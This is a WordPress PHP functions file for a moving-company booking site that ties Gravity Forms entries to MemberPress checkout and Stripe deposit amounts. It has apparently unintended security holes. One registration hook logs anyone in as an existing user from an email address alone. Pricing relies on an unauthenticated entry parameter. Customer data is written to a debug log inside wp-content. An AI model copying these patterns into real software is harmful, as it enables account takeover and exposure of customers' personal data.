<?php
add_filter('mepr_custom_field_html', function($html, $line, $value) {
    $entry_id = isset($_GET['entry']) ? intval($_GET['entry']) : 0;

    if ($line->field_key === 'mepr_entry_id') {
        $html = '<input type="hidden" name="mepr_entry_id" value="' . esc_attr($entry_id) . '">';
    }

	if ($line->field_key === 'mepr_membership_id') {
        $html = '<input type="hidden" name="mepr_membership_id" value="' . get_the_ID() . '">';
    }

	if ($line->field_key === 'mepr_amount_due_later') {
		$mepr_membership_id = get_the_ID();
		if ($mepr_membership_id) {
			$amount_due_later = get_field('amount_due', $mepr_membership_id);
		}
        $html = '<input type="hidden" name="mepr_amount_due_later" value="' . $amount_due_later . '">';
    }

    return $html;
}, 10, 3);



add_filter('gform_confirmation_' . $outsellers_gf_form_id, 'redirect_with_dynamic_calculated_price', 10, 4);
function redirect_with_dynamic_calculated_price($confirmation, $form, $entry, $ajax) {
	$entry_id = rgar($entry, 'id');
	$workers  = (int) rgar($entry, '11'); // Gravity Forms field ID 11
	$hours    = (int) rgar($entry, '12'); // Gravity Forms field ID 12

	$log_file = WP_CONTENT_DIR . '/gform_redirect_debug.log';


	if ($entry_id && $workers && $hours) {
		$args = [
			'post_type'  => 'memberpressproduct',
			'post_status'=> 'publish',
			'posts_per_page' => 1,
			'meta_query' => [
				'relation' => 'AND',
				[
					'key'     => 'workers',
					'value'   => $workers,
					'type'    => 'NUMERIC',
					'compare' => '='
				],
				[
					'key'     => 'hours',
					'value'   => $hours,
					'type'    => 'NUMERIC',
					'compare' => '='
				]
			]
		];

		$query = new WP_Query($args);

		if ($query->have_posts()) {
			$product = $query->posts[0];
			$redirect_url = get_permalink($product->ID) . '?entry=' . $entry_id;
			error_log("Redirecting to: " . $redirect_url . "\n", 3, $log_file);
			return ['redirect' => $redirect_url];
		} else {
			error_log("No matching product found.\n", 3, $log_file);
			return ['redirect' => home_url('/book-now')];
		}
	}

	error_log("Missing entry_id, workers, or hours.\n", 3, $log_file);
	return $confirmation;
}


add_filter('gform_user_registration_validation', 'ignore_existing_user_and_login', 10, 3);
function ignore_existing_user_and_login($form, $config, $pagenum) {
	if ($form['id'] != 4) {
		return $form;
	}

	$email_field_id = $config['meta']['email'];

	foreach ($form['fields'] as &$field) {
		if ($field->id == $email_field_id && $field->validation_message == 'This email address is already registered') {
			$email = rgpost("input_{$email_field_id}");

			if ($email && email_exists($email)) {
				$user = get_user_by('email', $email);
				if ($user) {
					wp_set_current_user($user->ID);
					wp_set_auth_cookie($user->ID, true);
					do_action('wp_login', $user->user_login);
				}
			}

			$field->failed_validation = false;
			$field->validation_message = '';
		}
	}

	return $form;
}

// add_action('template_redirect', 'redirect_with_no_entry');
// function redirect_with_no_entry() {
//     if (strpos($_SERVER['REQUEST_URI'], 'register/worker-downpayment') !== false) {
//         $entry_id = isset($_GET['entry']) ? intval($_GET['entry']) : 0;
//
//         if (!$entry_id || $entry_id <= 0 || !class_exists('GFAPI')) {
//             wp_redirect(home_url('/book-now'));
//             exit;
//         }
//     }
// }

add_filter('mepr_email_send_params', function($values, $email_obj, $subject, $body) {
	$log_file = WP_CONTENT_DIR . '/gform_redirect_debug.log';

	if (!empty($values['user_id'])) {
		$user_id  = $values['user_id'];
		$entry_id = get_user_meta($user_id, 'mepr_entry_id', true);
		$mepr_membership_id = get_user_meta($user_id, 'mepr_membership_id', true);
		$amount_due_later = get_user_meta($user_id, 'mepr_amount_due_later', true);
		error_log(print_r($email_obj, true), 3, $log_file);
		error_log(print_r($amount_due_later, true), 3, $log_file);

		error_log(print_r("mepr amount_due_later id", true), 3, $log_file);
		$values['mepr_amount_due'] = $amount_due_later;

		if ($entry_id) {
			$entry = GFAPI::get_entry($entry_id);

			if (!is_wp_error($entry)) {
				$values['mepr_entry_id']       = $entry_id;
				$values['gf_workers']          = $entry['11'];
				$values['gf_hours']            = $entry['12'];
				$values['gf_appt_date']        = $entry['22'];
				$values['gf_appt_time']        = $entry['41'];
				$values['gf_job_desc']         = $entry['25'];

				// Full name
				$values['gf_first_name']       = $entry['19.3'];
				$values['gf_last_name']        = $entry['19.6'];

				// Email + phone
				$values['gf_email']            = $entry['20'];
				$values['gf_phone']            = $entry['21'];

				// Address: build full string from separate fields
				$street     = $entry['18.1'] ?? '';
				$city       = $entry['18.3'] ?? '';
				$state      = $entry['18.4'] ?? '';
				$zip        = $entry['18.5'] ?? '';
				$country    = $entry['18.6'] ?? '';
				$full_addr  = trim("{$street}, {$city}, {$state} {$zip}, {$country}", ', ');
				$values['gf_address'] = $full_addr;

				// Collect all checked "Type of Work" values from field 1.*
				$type_of_work = [];
				foreach ($entry as $key => $val) {
					if (preg_match('/^1\.\d+$/', $key) && !empty($val)) {
						$type_of_work[] = $val;
					}
				}
				$values['gf_type_of_work'] = !empty($type_of_work) ? implode(', ', $type_of_work) : '';
			}
		}
	}

	return $values;
}, 10, 4);

add_action('mepr_transaction_applied_product_vars', 'otslr_set_price_from_query_txn');
function otslr_set_price_from_query_txn($txn) {
	$entry_id = isset($_GET['entry']) ? intval($_GET['entry']) : 0;
	// if (!$entry_id || $entry_id <= 0 || !class_exists('GFAPI')) {
	// 	wp_redirect(home_url('/book-now'));
	// 	exit;
	// }

	 $pricing = otslr_get_pricing_from_entry($entry_id);

	// if (!$pricing || $pricing['amount_due_now'] <= 0) {
	// 	wp_redirect(home_url('/book-now'));
	// 	exit;
	// }

	$txn->amount = $pricing['amount_due_now'];
	$txn->total = $pricing['amount_due_now'];
	$txn->set_subtotal($pricing['amount_due_now']);

	$product = $txn->product();
	$product->price = $pricing['amount_due_now'];

	return $txn;
}

function otslr_get_pricing_from_entry($entry_id, $product_id = 1728) {
    $entry = GFAPI::get_entry($entry_id);
    if (is_wp_error($entry)) return null;

    $total_workers = (int) rgar($entry, 11);
    $job_length    = (int) rgar($entry, 12);

    if ($total_workers <= 0 || $job_length <= 0) return null;

    $pricing = [
        'book_price' => 0,
        'amount_due_now' => 0,
        'amount_due_later' => 0
    ];

    $price_rows = get_field('prices', $product_id);

    if (!empty($price_rows) && is_array($price_rows)) {
        foreach ($price_rows as $row) {
            $acf_job_length  = (int) $row['job_length_hr'];
            $acf_hourly_rate = (float) str_replace('$', '', $row['worker_hourly']);
            $acf_downpayment = (float) str_replace('$', '', $row['downpayment_per_worker']);

            if ($acf_job_length === $job_length) {
                $pricing['book_price']       = $acf_hourly_rate * $job_length * $total_workers;
                $pricing['amount_due_now']   = $acf_downpayment * $total_workers;
                $pricing['amount_due_later'] = $pricing['book_price'] - $pricing['amount_due_now'];
                break;
            }
        }
    }

    return $pricing;
}


//add_action('gform_after_submission_' .$outsellers_gf_form_id, 'otslr_create_and_login_user', 10, 2);
function otslr_create_and_login_user($entry, $form) {
	$email = rgar($entry, '20'); // Replace with your actual Email field ID
	$first = rgar($entry, '19.3'); // First name
	$last  = rgar($entry, '19.6'); // Last name

	if (!$email) return;

	$user = get_user_by('email', $email);

	if (!$user) {
		$password = wp_generate_password();
		$user_id = wp_create_user($email, $password, $email);

		if (!is_wp_error($user_id)) {
			wp_update_user([
				'ID'         => $user_id,
				'first_name' => $first,
				'last_name'  => $last
			]);

			$user = get_user_by('ID', $user_id);
		}
	}

	if ($user) {
		wp_set_current_user($user->ID);
		wp_set_auth_cookie($user->ID, true);
		do_action('wp_login', $user->user_login, $user);
	}
}




add_action('mepr-txn-store', 'otslr_override_txn_total_on_store', 10, 2);
function otslr_override_txn_total_on_store($txn, $old_txn) {
	if (!isset($_GET['entry'])) return;

	$pricing = otslr_get_pricing_from_entry((int) $_GET['entry']);
	if (empty($pricing['amount_due_now']) || $pricing['amount_due_now'] <= 0) return;

	$txn->amount = $pricing['amount_due_now'];
	$txn->total = $pricing['amount_due_now'];
	$txn->set_subtotal($pricing['amount_due_now']);

	$product = $txn->product();
	$product->price = $pricing['amount_due_now'];

	$txn->store(); 
}


add_filter('mepr_stripe_payment_intent_args', 'otslr_override_stripe_payment_amount', 10, 2);
function otslr_override_stripe_payment_amount($args, $txn) {
	if (!isset($_GET['entry'])) return $args;

	$pricing = otslr_get_pricing_from_entry((int) $_GET['entry']);
	if (!empty($pricing['amount_due_now']) && $pricing['amount_due_now'] > 0) {
		$args['amount'] = (int) ($pricing['amount_due_now'] * 100); // Stripe uses cents
	}

	return $args;
}


add_action('mepr-checkout-before-submit', 'outsellers_mepr_confirm');
function outsellers_mepr_confirm($membership_id) {
    ?>
    <div class="mp-form-row mepr_custom_field mepr_terms_conditions mepr-field-required">
        <label for="mepr_terms_conditions" class="mepr-checkbox-field mepr-form-input">
            <input type="checkbox" name="mepr_terms_conditions" id="mepr_terms_conditions" required>
            I affirm that I've reviewed and agreed to the <a href="https://movenhome.com/terms-and-conditions/">Terms and Conditions</a> and the <a href="https://movenhome.com/privacy-policy-2/">Privacy Policy</a> <span class="required">*</span>.
        </label>
    </div>

    <div class="mp-form-row mepr_custom_field mepr_receive_discounts">
        <label for="mepr_receive_discounts" class="mepr-checkbox-field mepr-form-input">
            <input type="checkbox" name="mepr_receive_discounts" id="mepr_receive_discounts">
            I agree to receive Move N Home coupons and discounts.
        </label>
    </div>

    <div class="mp-form-row mepr_custom_field mepr_receive_communications">
        <label for="mepr_receive_communications" class="mepr-checkbox-field mepr-form-input">
            <input type="checkbox" name="mepr_receive_communications" id="mepr_receive_communications">
            By checking this box, I agree to receive communications, including email, calls, and text messages from Move And Home regarding announcements and company updates. Reply to any messages with STOP at any time to stop receiving messages and to continue receiving help reply START to remove opt-out.
        </label>
    </div>
    <?php
}

add_filter('mepr-validate-signup', function($errors) {
	if (empty($_POST['mepr_terms_conditions'])) {
		$errors[] = 'You must affirm the Terms and Conditions before registering.';
	}

	return $errors;
});
  

add_filter('mepr-price-string', 'complimentary_price_string', 15, 3);
function complimentary_price_string($price_str, $obj, $show_symbol) {
	if (is_admin() && !wp_doing_ajax()) {
		return $price_str;
	}

	if (strpos($_SERVER['REQUEST_URI'], 'register') === false) {
		return $price_str;
	}

	if ($obj instanceof MeprTransaction) {
		$price_str = MeprAppHelper::format_currency($obj->total, $show_symbol);
	}

	return $price_str;
}



add_filter('mepr-product-renewal-string', 'complimentary_renewal_str', 15, 3);
function complimentary_renewal_str($renewal_str, $product) {
	if (is_admin() && !wp_doing_ajax()) {
		return $renewal_str;
	}

	return '';
}

